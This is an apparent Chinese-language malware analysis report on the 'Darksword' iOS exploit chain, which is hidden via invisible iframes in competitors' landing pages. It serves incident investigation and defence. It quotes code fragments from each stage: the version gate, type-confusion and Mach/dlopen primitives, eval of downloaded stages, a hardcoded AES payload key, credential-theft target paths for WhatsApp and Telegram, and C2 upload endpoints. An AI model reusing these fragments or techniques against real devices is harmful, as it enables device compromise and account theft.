# 同行落地页攻击链详细报告（2026-08-17）

> 本文聚焦五个同行落地页中隐藏的**设备攻击链**，从入口分流到最终载荷，
> 全部环节均有已保存的文件原文支撑。取证档案见
> [`evidence/`](./evidence/)（含 SHA256 清单，勿执行）。
> 本文补充 [详细技术评审](./technical-review-detailed.md) 第八节。

## 一、结论摘要

同行落地页（`c/b/d/a.ttsmi66.xyz` 与 `myloveday.falan123.com` 中带 iframe 者）
内置了一条**完整的 iOS 武器化漏洞利用链**，代号 **Darksword**：

1. 访客用 iPhone、iOS ≥ 18.4 打开页面即触发；
2. 依次攻破 JavaScriptCore 引擎 → 逃出 WebContent 沙箱 → 提权 →
   注入 SpringBoard（系统桌面进程）；
3. 最终载荷**定向窃取 WhatsApp（个人版+商务版）与 Telegram 的账号凭证**，
   并执行全盘取证盗窃（钥匙串、短信、通讯录、通话记录、照片、定位等）；
4. 数据加密上传到 C2：`/api/v1/whatsapp/upload`、`/api/v1/telegram/upload`、
   `/api/v1/device/activate`、`/api/v1/device/apps`。

这与页面明线的"绑定 WhatsApp Web 会话"是**同一运营的两条线**：明线拿
Web 端密钥，暗线强取设备端凭证（`cck.dat`/`rc1.dat`/JID），两头通吃。

## 二、链条总览

```
落地页 (ttsmi66.xyz)                     C2 域 v1.io92jujjs33.com
  └─ 0×0 iframe ────────────────► router.js
                                      │ iOS 版本解析；≥18.4 才继续
                                      ▼
                                   ds_rce_loader.js（stage1 编排）
                                      │ ip-sync(500ms 起 + 每 20s)；换 deviceId
                                      │ 下载并用 eval 执行：
                                      ├─ ds_rce_module.js   ← JSC 任意读写原语
                                      ├─ ds_rce_worker.js   ← 类型混淆 + Mach + dlopen
                                      ▼
                                   ds_sbx0.js  ← 沙箱逃逸（GPU 进程消息名表）
                                   ds_sbx1.js  ← 提权衔接
                                   ds_pe.js    ← 收尾：钥匙串/文件/TCC + 注入 SpringBoard
                                      │ SpringBoard 内 httpsGet：
                                      ▼
                                   /extract.js.enc（AES-256-ECB 密文）
                                      │ DARKSWORD_PAYLOAD_KEY 解密 → eval
                                      ▼
                                   extract_payload.js（Darksword data extraction）
                                      └─ 窃取并上传 WhatsApp / Telegram / 设备数据
```

| 文件 | 大小 | 阶段 | 明文/混淆 |
| --- | --- | --- | --- |
| `router.js` | 1.2KB | 0 分流 | 明文 |
| `ds_rce_loader.js` | 13.5KB | 1 编排 | 明文（含中文注释） |
| `ds_rce_module.js` | 173KB | 2 引擎攻破 | 明文 |
| `ds_rce_worker.js` | 43KB | 2 触发/逃逸准备 | 明文 |
| `ds_rce_worker_18.6.js` | 526KB | 2 变体（iOS 18.6） | 明文 |
| `ds_rce_module_18.6.js` | 85B | 占位 | 明文 |
| `ds_sbx0.js` | 424KB | 3 沙箱逃逸 | 明文 |
| `ds_sbx1.js` | 318KB | 3 提权衔接 | 明文 |
| `ds_pe.js` | 560KB | 4 收尾利用 | 明文 |
| `extract.js.enc` | 41KB | 5 最终载荷（密文） | AES-256-ECB |
| `extract_decrypted.js` | 41KB | 5 解密产物 | 明文 |

## 三、阶段 0：版本门控（router.js）

`router.js` 全文 1.2KB，逻辑：

1. 三种正则解析 iOS 版本（兼容 `Version/x.y`、`iOS/x.y`、`iPhone OS x_y_z`）；
2. 内联生成 64 位指纹：`hash(UA + '|' + navigator.language + '|' +
   screen.width×height)`，写入 `window.FINGERPRINT`，注释写明"确保
   ds_rce_loader.js 加载前 window.FINGERPRINT 已就绪"；
3. 原文门控：

```js
if (ver >= 180400) {
    loadScript('ds_rce_loader.js');   // 带 ?Date.now() 防缓存
}
```

即：**iOS < 18.4 的访客只被跟踪，不被投毒**。

## 四、阶段 1：编排与设备建档（ds_rce_loader.js，444 行）

关键常量与逻辑（原文）：

```js
const CHANNEL_CODE = "697098348a461b7656bdc02e5f52fca9";
const C2_DOMAIN = location.hostname;         // C2 = 当前 iframe 域名
// 门页域名：door 参数 > referrer(iframe场景) > 自身域名
const DOOR_DOMAIN = (function() { ... })();
```

- **建档**：`POST /api/v1/ip-sync`，body
  `{fingerprint, channelCode, deviceVersion, source, domain}`，
  source 按 UA 判 Facebook/Instagram/Messenger/Safari/Other；
  同步 XHR 取回 `data.deviceId` 存 `window._dsDeviceId`（注释："解决
  数据错配问题"）。
- **心跳**：`setTimeout(report, 500); setInterval(report, 20000);`
  用 `navigator.sendBeacon` 每 20 秒上报一次。
- **分流**：iOS 18.6.x 用 `ds_rce_worker_18.6.js`，否则
  `ds_rce_worker.js`；`ds_rce_module.js`（18.6 版为 85B 占位）经
  `eval(rceCode)` 执行。
- **触发协议**（loader ↔ worker 消息）：
  - `prepare_dlopen_workers`：建 2 个 Worker，各执行
    `OffscreenCanvas(1×1)` + `createImageBitmap`，把伪造数据
    `0x11111111 * i` 塞入 `globalThis[0]`；
  - `trigger_dlopen1/2`：对 bitmap 执行 `close()`（触发点），随后
    `check_dlopen1/2` 回验；
  - `sign_pointers`/`slow_fcall`：`iframe.contentDocument.write('1')`
    做指针签名旁路，回 `setup_fcall`/`slow_fcall_done`；
  - 校验函数 `check_attempt().start()` 连续两次失败才
    `retryOnce("check_attempt_failed")`；
  - 成功则向 worker 投递 `stage1` 消息，携带：
    `begin, origin, ios_version, offsets, slide, chipset, device_model,
    desiredHost, channelCode, c2Domain, landingDomain`；
    18.6 分支直接投递 `stage1_rce`（另带 `deviceId`）。
- **隐蔽设计**：180 秒超时只刷新 iframe 自身（`retry_once:{path}` 记在
  sessionStorage，最多一次），**绝不重载父页面**；日志走同步
  `GET /log.html`（`SERVER_LOG` 开关）。

## 五、阶段 2：引擎攻破（ds_rce_module.js + ds_rce_worker.js）

`ds_rce_module.js`（173KB）负责在页面里建立 JSC 原语，特征（函数/变量名
与用法，逐处可见）：

- 指针↔浮点互转：`BigInt.fromDouble` / `BigInt.prototype.asDouble`；
- 原语：`addrof`（6 处）、`fakeobj`（5 处）、`read64`（44 处）、
  `write64`（9 处）；
- `mach`（26 处）、`pac`（31 处）、`kernel`（26 处）、`offsets`/`slide`/
  `chipset`/`device_model`——内核偏移准备。

`ds_rce_worker.js`（43KB）在 Worker 里执行，开头即类型混淆配置：

```js
const no_cow = 1.1;
const unboxed_arr = [no_cow];
const boxed_arr = [{}];
self[0] = unboxed_arr; self[1] = boxed_arr;
```

以及 Mach IPC 编码器：`class Encoder { constructor(messageName,
destinationID) ... encode('uint8_t', 0) ... }`。尾部动作（原文）：

```js
offsets.libsystem_kernel__thread_terminate = p.slide + 0x1D3D6F244n;
function suspend_worker(worker) {
    const port = p.read32(worker.thread + 0x34n);
    return fcall(offsets.libsystem_kernel__thread_suspend, port);
}
...
const sbx0_script = getJS('ds_sbx0.js');   // 下载下一阶段并执行
eval(sbx0_script);
...
self.postMessage({ type: 'redirect' });
```

即：构造任意读写 → 挂起线程 → 下载并执行沙箱逃逸脚本。

## 六、阶段 3：沙箱逃逸与提权（ds_sbx0.js / ds_sbx1.js）

`ds_sbx0.js`（424KB）开头：

```js
const libsystem_kernel = dlopen('/usr/lib/system/libsystem_kernel.dylib', 1n);
const libsystem_platform = dlopen('/usr/lib/system/libsystem_platform.dylib', 1n);
offsets.mach_msg_fn = dlsym(libsystem_kernel, 'mach_msg')...
```

核心是**WebKit GPU 进程消息名表**，按机型 + iOS build 组织，例如：

```
"iPhone11,8_22E240": {
   GPUConnectionToWebProcess_CreateGraphicsContext...: 0x...,
   RemoteGraphicsContextGLProxy_WasCreated: 0x408,
   RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
   WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca, ...
}
```

用途：通过 GPU 进程 Mach 消息在 WebContent 沙箱外执行——这是逃逸手段，
不是网络代理（此前按关键词"proxy"误读为网络代理，此处已修正）。
`ds_sbx1.js`（318KB）继续衔接，尾部 `getJS('ds_pe.js')` 下载收尾阶段。

## 七、阶段 4：收尾利用（ds_pe.js，560KB）

- **钥匙串复制器**：webpack 模块名原文 `./src/keychain_copier.js`，
  清单含 `/private/var/Keychains/keychain-2.db(-wal/-shm/journal)`、
  `Backup.keybag`、`System.keybag`、`device.kb`、`persona.kb`、
  `usersession.kb`、`/private/var/keybags/backup/` 等。
- **TCC 授权申请**：`getTokenForPath(path, ...)` 对下列路径逐一取
  系统隐私令牌（部分原文清单）：
  - SMS：`/private/var/mobile/Library/SMS/`
  - 通讯录：`Library/AddressBook/`
  - 通话/语音：`Library/CallHistoryDB/`、`Library/Voicemail/`
  - 照片：`Media/DCIM/`、`Media/PhotoData/`
  - 定位历史：`Library/Caches/locationd/`、`com.apple.routined/`
  - 行为数据库：`Library/CoreDuet/Knowledge/knowledgeC.db*`
  - 其他：`Calendar/`、`Notes/`、`Mail/`、`Health/`、`Safari/`、
    `Cookies/`、`UserNotifications/`、`Shortcuts/`、
    `Preferences/com.apple.commcenter.shared.plist`、
    WiFi 配置 `preferences/SystemConfiguration/com.apple.wifi.plist`、
    `com.apple.wifi.known-networks.plist`、`Accounts/`、
    `Logs/CrashReporter/`、`DiagnosticReports/` 等。
- **打包与传输**：文件读写辅助函数存在（`writeFile`/`appendFile`/`readFile`，
  写 `/private/var/tmp`），但本版本中 `keychain_copier.js` 与
  `icloud_dumper.js` 两个载荷模块被导出为**空字符串**（占位），且
  `ds_pe.js` 内**没有**这些数据的上传端点或传输函数（无
  `postEncryptedToC2`/`httpsPost`/`upload` 字符串；此前按关键词计数的
  "tar=210" 经复核为 `start`/`target`/`registerName` 等词的子串误报，
  **并无 tar 打包证据**）。即：全盘读取清单与 TCC 授权代码在，但"送出去"
  的环节不在已捕获文件里——可能由运行时下发的后续载荷完成。
- **SpringBoard 注入**：内嵌 "Downloader Stub Payload" 字符串载荷，
  注释原文：

```js
// Runs under SpringBoard context (has network access)
// Downloads extract_payload.js from C2, decrypts, and evals
const DARKSWORD_PAYLOAD_KEY = "a3f8c2e1b5d9470f6c8a1e3b7d5f9201e4b6d082f7a5c31690d2e8f4a1b0c573";
```

- **下载+解密+执行**：stub 用原生 `httpsGet(host, path, 443)` 请求
  `/extract.js.enc`（最多 3 次，间隔 2s），手工解析 HTTP 响应体，
  `aesDecrypt(body, DARKSWORD_PAYLOAD_KEY)` 后 `eval(decrypted)`。
  解密实现（原文）：`libcommonCrypto` 的 `CCCryptorCreate(kCCDecrypt,
  kCCAlgorithmAES, kCCOptionECBMode, key32B, …)`——**AES-256-ECB，
  密钥为 64 位 hex 解码出的 32 字节**。

## 八、阶段 5：最终载荷（extract_payload.js，已解密）

`/extract.js.enc`（41KB）已在本地用上述参数解密，明文 1257 行，头部：

```js
// extract_payload.js - Darksword data extraction
// Generated: 2026-07-03T07:47:13.304Z
```

模块结构（webpack/raw-loader 打包）：`base64.js`、`crypto.js`、
`device.js`、`network.js`、`objc.js`、`sqlite.js`、`telegram.js`、
`whatsapp.js`、`index.js`。

### 8.1 WhatsApp 专属提取（whatsapp.js）

定位常量（原文）：

```js
const WA_SHARED_GROUP     = "group.net.whatsapp.WhatsApp.shared";
const WA_SHARED_GROUP_SMB = "group.net.whatsapp.WhatsAppSMB.shared";
const WA_APP_BUNDLE       = "net.whatsapp.WhatsApp";
const WA_SMB_BUNDLE       = "net.whatsapp.WhatsAppSMB";
```

注释原文写明目标：

```js
// WhatsApp data extraction (simplified - cck.dat + userId only)
// cck.dat = 32B recovery key in AppGroup
// userId = OwnJabberID from shared plist
```

提取步骤（步骤状态机，每步失败都会产生 `waDiagPayload` 诊断上报）：

| 步骤 | 动作 | 结果 |
| --- | --- | --- |
| appGroup | 定位 AppGroup 容器 | 失败→diag |
| plistRead | 读 `group.net.whatsapp.WhatsApp.shared.plist` | 失败→diag |
| loggedInLid | 检查 `@lid` 是否在登录态（登出会被清空） | 未登录→diag |
| phoneFromJid | 从 `@s.whatsapp.net` 反解手机号 | 失败→diag |
| appContainer | 定位应用容器 | 失败→diag |
| rc1Read/rc1Len | 读 `rc1.dat` 长度与内容 | 失败→diag |
| field2Token/tokenLen | 提取 rc 文件中的验证字段 token | 失败→diag |

- `cck.dat`：AppGroup 内 32 字节**恢复密钥**（账号恢复的根凭证）；
- `rc1.dat`：应用容器内设备验证数据（field2 token）；
- `OwnJabberID`：登录账号 JID（含手机号）。

### 8.2 Telegram 专属提取（telegram.js）

`extractTelegram(...)`，结果上传 `/api/v1/telegram/upload`。

### 8.3 上传端点与数据流（index.js）

最终载荷的全部上传端点（原文字符串）：

```
/api/v1/device/activate    ← 设备激活（设备信息+唯一标识）
/api/v1/device/apps        ← 已安装应用清单 extractInstalledApps()
/api/v1/telegram/upload    ← Telegram 凭证
/api/v1/whatsapp/upload    ← WhatsApp 个人版 + 商务版（两次调用）
```

传输使用 `postEncryptedToC2(CD, path, payload)`（加密上行）；WhatsApp
数据包含 `channel: CC`（渠道码）、`unique: deviceId`、`edition:
personal/business` 与提取的凭证；失败时上传 `dataType:"diag"` 诊断包
（只含步骤与失败点，注释原文："steps only, no extra secrets"——说明
这是带失败监控的常态化运营）。

## 九、数据流向总表

| 数据 | 来源文件 | 出口 |
| --- | --- | --- |
| 设备指纹/版本/来源/门页 | `router.js`、`ds_rce_loader.js` | `/api/v1/ip-sync`（500ms + 每 20s） |
| 设备唯一 ID | ip-sync 响应 | 存 `window._dsDeviceId` 贯穿后续 |
| 攻击进度/错误 | `ds_rce_loader.js` | `/log.html`、`/api/v1/debug` |
| 钥匙串（全部密码/令牌） | `ds_pe.js` keychain_copier（本版本为空占位） | 传输出口未在已捕获文件中定位 |
| 短信/通讯录/通话/照片/定位/WiFi/Cookies 等 | `ds_pe.js` TCC+文件清单（读取代码存在） | 传输出口未在已捕获文件中定位 |
| WhatsApp 凭证（个人+商务） | `extract_payload.js` whatsapp.js | `/api/v1/whatsapp/upload` |
| Telegram 凭证 | `extract_payload.js` telegram.js | `/api/v1/telegram/upload` |
| 设备激活信息 | `extract_payload.js` device.js | `/api/v1/device/activate` |
| 已安装应用清单 | `extract_payload.js` extractInstalledApps | `/api/v1/device/apps` |

## 十、威胁定性

- **性质**：完整的 iOS 浏览器 0day/1day 利用链（JSC 任意读写 → PAC 绕过
  → GPU 进程沙箱逃逸 → Mach/原生代码 → SpringBoard 注入），最终载荷为
  定向账号凭证窃取 + 全盘取证盗窃。代号 "Darksword"，载荷生成时间
  2026-07-03，说明在 2026 年 7 月已在生产。
- **与业务的关系**：明线（`/api/lp/wa-accounts/*` 配对码绑定，拿
  WhatsApp Web 会话密钥）与暗线（本攻击链拿 `cck.dat`/`rc1.dat`/JID
  等设备级凭证）相互独立运行、互相不依赖，但都归入同一运营的
  WhatsApp 账号资产体系——Web 端密钥 + 设备端凭证形成完整接管能力。
- **受害面**：iOS ≥ 18.4 的 Safari/内嵌浏览器（Facebook/Instagram/
  Messenger）访客；按渠道码、门页域名、设备版本做 campaign 台账。

### 10.1 公开情报对照：DarkSword 与六个 CVE

本链与公开报道的 **DarkSword iOS 利用链**完全吻合（解密载荷自述
"Darksword data extraction"、密钥常量 `DARKSWORD_PAYLOAD_KEY`）。
2026-03 谷歌报告曝光，随后多家安全厂商公开分析；共串联 **6 个 CVE，
其中 3 个首发时为零日**，且已被 CISA 列入 KEV 目录：

| CVE | 位置 | 修复版本 | 对应本文文件 |
| --- | --- | --- | --- |
| CVE-2025-31277 | JavaScriptCore 内存破坏 | iOS 18.6（2025-07） | `ds_rce_module.js`/`ds_rce_worker.js`（JSC 原语） |
| CVE-2025-43529 | JavaScriptCore 内存破坏（首发零日） | iOS 26.3（2025-11） | 同上（18.6 专用变体切换用） |
| CVE-2025-14174 | ANGLE GPU 进程内存破坏（首发零日） | iOS 26.3 | `ds_sbx0.js`（GPU 消息名表逃逸） |
| CVE-2025-43510 | 内核内存问题 | iOS 26.2（2025-11） | `ds_sbx1.js`/`ds_pe.js`（IOSurface/socket 内核读写） |
| CVE-2025-43520 | 内核内存破坏 | iOS 26.2 | 同上 |
| CVE-2026-20700 | dyld PAC 绕过（首发零日） | iOS 26.3（2025-12） | `ds_pe.js`（pacia/签名线程/伪造签名） |

这与代码证据互相印证：18.6.x 走专用 worker 变体——对应 31277 在
iOS 18.6 已被修复、链切换用 43529；`ds_sbx0.js` 的 GPU 进程消息名表
对应 ANGLE 漏洞（WebKit 修复提交即 "GPU Process: IOSurfaces should
not be mapped into the Web Content Process"）；`ds_pe.js` 的
`ptrauth_blend_discriminator`/`remotePAC`/签名线程对应 dyld PAC 绕过。

公开来源：[Help Net Security](https://www.helpnetsecurity.com/2026/03/19/darksword-ios-exploit-iphone/)、
[Ciphers Security](https://cipherssecurity.com/darksword-ios-exploit-chain-six-cves-zero/)、
[8kSec 技术分析](https://www.8ksec.io/darksword-kernel-escalation-cve-2025-43510-43520/)、
[Security Affairs](https://securityaffairs.com/189662/hacking/darksword-emerges-as-powerful-ios-exploit-tool-in-global-attacks.html)、
[The Register（谷歌警告）](https://www.theregister.com/security/2026/03/18/snoops-plant-info-stealing-malware-on-iphones-google-warns/5222098)、
[公开 PoC 仓库](https://github.com/20obb/darksword-Exploit)。

## 十一、与我们系统的对照与防线

**我们系统没有任何此类能力，也不应有。** 结构性防线：

1. 模板 ZIP 只允许 `.html/.css/.js/.json/图片字体` 且禁止外链脚本、
   禁止 sourcemap；生产渲染 CSP 为 `sandbox` 且 `frame-src 'none'`、
   `script-src` 白名单仅平台域 + `connect.facebook.net`——模板无法塞入
   任意 iframe 或外联 C2（`_sandbox_csp`，promotion.py）。
2. 页面里可执行的一切由平台注入的 `tracker.js`/`guard.js`/
   `account-link-elements.js` 控制，模板无法自行注入追踪或攻击逻辑
   （spec v2 "模板不得注入 analytics SDK / 外部 iframe"）。
3. 若未来担心供应链投毒（上游模板包被替换成含此类 iframe 的版本），
   建议增加：模板 ZIP 导入时的**静态扫描规则**（iframe 标签、外链
   script、`eval` 大段密文、`WebSocket/Worker` 构造等特征告警），并在
   渲染管线对渠道页做**基线哈希对比**。

**红线（永不跟进）**：任何形式的浏览器/内核漏洞利用、跨域隐藏 iframe、
未声明数据采集、以及把访客设备凭证（而非用户主动配对）作为获取手段。

## 十二、取证方法

1. 用手机 UA 抓取五个落地页 → 发现 S2/S3/S5 内嵌 0×0 iframe
   `https://v1.io92jujjs33.com`。
2. 抓 `router.js` → 发现 iOS ≥ 18.4 加载 `ds_rce_loader.js`。
3. 全文阅读 `ds_rce_loader.js` → 枚举其 `getJS()` 下载的全部阶段文件。
4. 逐级下载 `ds_rce_module/worker/sbx0/sbx1/pe` 并静态分析（关键词 +
   上下文 + 关键段落全文阅读；**未执行任何文件**）。
5. `ds_pe.js` 中发现最终载荷路径 `/extract.js.enc` 与
   `DARKSWORD_PAYLOAD_KEY`，下载密文后用
   `openssl enc -d -aes-256-ecb` 本地解密得到明文。
6. 全部文件归档于 [`evidence/`](./evidence/)，SHA256 见
   [`evidence/SHA256SUMS.txt`](./evidence/SHA256SUMS.txt)；本目录
   [`README.md`](./README.md) 含样本范围、解密记录与处置建议。

## 附录：关键证据原文摘录

- 门控：`if (ver >= 180400) { loadScript('ds_rce_loader.js'); }`
  （`router.js`）
- 心跳：`setTimeout(report, 500); setInterval(report, 20000);`
  （`ds_rce_loader.js:214-215`）
- 触发：`worker.postMessage({type:'dlopen'})` /
  `iframe.contentDocument.write('1')`（`ds_rce_loader.js` 消息协议）
- 逃逸：`RemoteGraphicsContextGLProxy_WasCreated: 0x408, ...` 等消息名表
  （`ds_sbx0.js`）
- 收尾：`// Reads and exfiltrates forensically-relevant files from iOS
  device via HTTP`（`ds_pe.js` Downloader Stub 注释）
- WhatsApp 目标：`// cck.dat = 32B recovery key in AppGroup`、
  `const WA_SHARED_GROUP = "group.net.whatsapp.WhatsApp.shared"`
  （`extract_decrypted.js` whatsapp.js）
- 出口：`/api/v1/whatsapp/upload`、`/api/v1/telegram/upload`、
  `/api/v1/device/activate`、`/api/v1/device/apps`
  （`extract_decrypted.js` index.js）
